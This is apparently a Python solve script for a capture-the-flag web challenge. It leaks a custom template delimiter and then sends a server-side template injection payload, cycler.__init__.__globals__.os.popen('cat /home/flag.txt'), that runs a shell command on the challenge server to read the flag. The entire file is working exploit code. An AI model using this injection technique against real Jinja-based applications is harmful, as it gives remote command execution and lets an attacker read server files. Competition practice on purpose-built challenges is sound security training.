import requests
import re

req = requests.session()

url = "http://mybidda.challs.srdnlen.it"
res = req.post(url+"/send_bidda", data={"name": "whatever", "population": "whatever", "image": "whatever"})

res = req.get(url+"/inspect_bidda?name=variable_start_string")

key_index = res.text.find("called ")
key = res.text[key_index+7:key_index+18]

payload = key+" cycler.__init__.__globals__.os.popen('cat /home/flag.txt').read() "+key[1:]+'!'
res = req.post(url+"/send_bidda", data={"name": payload, "population": "whatever", "image": "whatever"}).text

flag = re.search("srdnlen{(.*)}", res).group(0)
print(flag)